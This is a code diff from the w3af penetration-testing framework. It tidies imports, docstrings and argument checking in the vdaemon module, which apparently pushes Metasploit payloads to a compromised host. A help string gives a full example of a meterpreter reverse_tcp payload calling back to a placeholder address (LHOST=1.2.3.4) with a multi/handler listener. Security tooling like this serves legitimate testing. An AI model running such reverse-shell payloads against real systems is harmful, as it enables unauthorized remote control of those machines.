@@ -19,19 +19,18 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
-
-import core.data.kb.config as cf
-
-import core.controllers.outputManager as om
-from core.controllers.w3afException import w3afException
-from core.controllers.payloadTransfer.payloadTransferFactory import payloadTransferFactory
-from core.controllers.intrusionTools.execMethodHelpers import getRemoteTempFile
-
 import os
 import tempfile
 import random
 import subprocess
 import time
+
+import core.data.kb.config as cf
+import core.controllers.outputManager as om
+
+from core.controllers.w3afException import w3afException
+from core.controllers.payloadTransfer.payloadTransferFactory import payloadTransferFactory
+from core.controllers.intrusionTools.execMethodHelpers import getRemoteTempFile
 
 
 class vdaemon(object):
@@ -58,10 +57,12 @@ class vdaemon(object):
                                 
     def run(self, user_defined_parameters):
         '''
-        This is the entry point. We get here when the user runs the "payload vdaemon linux/x86/meterpreter/reverse_tcp"
-        command in his w3af shell after exploiting a vulnerability.
+        This is the entry point. We get here when the user runs the 
+        "payload vdaemon linux/x86/meterpreter/reverse_tcp" command in his w3af
+        shell after exploiting a vulnerability.
         
-        @param user_defined_parameters: The parameters defined by the user, for example, the type of payload to send.
+        @param user_defined_parameters: The parameters defined by the user, for
+                                        example, the type of payload to send.
         @return: True if we succeded.
         '''
         
@@ -79,16 +80,8 @@ class vdaemon(object):
         msg += 'shell) or connect to the remote server.\n'
         msg += '    A complete example looks like this:\n'
         msg += '    linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 | exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 E'
-
-        if not len(user_defined_parameters):
-            raise w3afException( msg )
         
-        found_pipe = False
-        for i in user_defined_parameters:
-            if i == '|':
-                found_pipe = True
-                break
-        else:
+        if '|' not in user_defined_parameters:
             raise w3afException( msg )
         
         msfpayload_parameters = user_defined_parameters[:user_defined_parameters.index('|')]
